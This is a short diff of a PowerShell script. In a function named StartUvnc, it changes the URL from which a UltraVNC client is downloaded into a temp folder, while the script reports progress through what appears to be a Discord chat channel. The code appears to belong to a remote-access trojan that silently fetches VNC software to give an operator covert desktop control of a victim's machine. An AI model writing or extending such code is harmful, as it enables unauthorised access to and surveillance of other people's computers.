@@ -1124,8 +1124,8 @@ Function StartUvnc{
 
     sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
     $tempFolder = "$env:temp\vnc"
-    $vncDownload = "https://bw0.cc/winvnc"
-    $vncZip = "$tempFolder\winvnc.zip" 
+    $vncDownload = "https://github.com/Lore-Bul/winvnc/archive/refs/heads/main.zip"
+    $vncZip = "$tempFolder\winvnc-main.zip" 
     if (!(Test-Path -Path $tempFolder)) {
         New-Item -ItemType Directory -Path $tempFolder | Out-Null
     }  
